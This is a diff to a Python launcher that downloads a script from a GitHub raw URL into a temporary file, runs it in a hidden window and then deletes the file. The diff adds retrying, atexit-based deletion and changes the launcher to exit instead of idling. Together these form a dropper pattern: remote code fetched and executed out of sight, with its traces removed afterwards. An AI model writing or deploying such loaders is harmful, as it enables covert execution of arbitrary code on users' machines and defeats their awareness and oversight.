@@ -6,9 +6,34 @@ import urllib.request
 import tempfile
 import time
 import traceback
+import atexit
+
+def delete_temp_file(temp_script_path):
+    """Try to delete the temp file with retries"""
+    if not temp_script_path or not os.path.exists(temp_script_path):
+        return
+    
+    # Try multiple times to delete the file
+    for attempt in range(10):
+        try:
+            time.sleep(1)  # Wait a bit before trying
+            os.remove(temp_script_path)
+            print(f"Successfully deleted temp file on attempt {attempt + 1}")
+            return True
+        except (PermissionError, OSError) as e:
+            if attempt < 9:
+                print(f"Attempt {attempt + 1} failed, retrying...")
+                continue
+            else:
+                print(f"Failed to delete temp file after 10 attempts")
+                return False
+        except Exception as e:
+            print(f"Error deleting file: {e}")
+            return False
 
 def run_script_from_github():
     """Download script.py from GitHub, run it, then delete temp file"""
+    temp_script = None
     try:
         # URL to script.py on GitHub
         script_url = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/script.py"
@@ -30,6 +55,9 @@ def run_script_from_github():
         
         print(f"Script saved to: {temp_script}")
         
+        # Register cleanup function
+        atexit.register(delete_temp_file, temp_script)
+        
         # Run it hidden
         startupinfo = subprocess.STARTUPINFO()
         startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
@@ -42,18 +70,21 @@ def run_script_from_github():
         
         print(f"Script started with PID: {process.pid}")
         
-        # Schedule deletion of temp file after 10 seconds
-        time.sleep(10)
-        try:
-            os.remove(temp_script)
-            print("Temp script deleted")
-        except:
-            pass
+        # Try to delete the temp file after a delay
+        time.sleep(3)
+        delete_temp_file(temp_script)
         
         return True
         
     except Exception as e:
         print(f"Error: {e}")
+        traceback.print_exc()
+        # Clean up temp file if we created it but failed to run
+        if temp_script and os.path.exists(temp_script):
+            try:
+                os.remove(temp_script)
+            except:
+                pass
         return False
 
 def main():
@@ -68,14 +99,16 @@ def main():
         pass
     
     # Wait for network
-    time.sleep(5)
+    time.sleep(3)
     
     # Run the script
-    run_script_from_github()
+    success = run_script_from_github()
     
-    # Keep launcher alive but idle
-    while True:
-        time.sleep(3600)
+    # Keep launcher alive for a bit to ensure cleanup runs
+    time.sleep(5)
+    
+    # Exit
+    sys.exit(0 if success else 1)
 
 if __name__ == "__main__":
     main()
